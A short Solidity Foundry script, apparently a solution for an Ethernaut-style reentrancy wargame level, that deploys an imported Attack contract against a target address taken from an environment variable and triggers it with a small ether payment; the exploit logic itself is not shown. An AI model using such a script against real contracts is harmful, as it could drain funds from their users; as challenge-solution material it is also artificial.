// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Attack} from "../src/Attack.sol";

contract AttackScript is Script {
    function run() external {
        address targetAddress = vm.envAddress("REENTRANCE_INSTANCE");

        vm.startBroadcast();
        Attack attacker = new Attack(targetAddress);
        attacker.attack{value: 0.0001 ether}();
        vm.stopBroadcast();

        console.log("Attack contract deployed at:", address(attacker));
    }
}
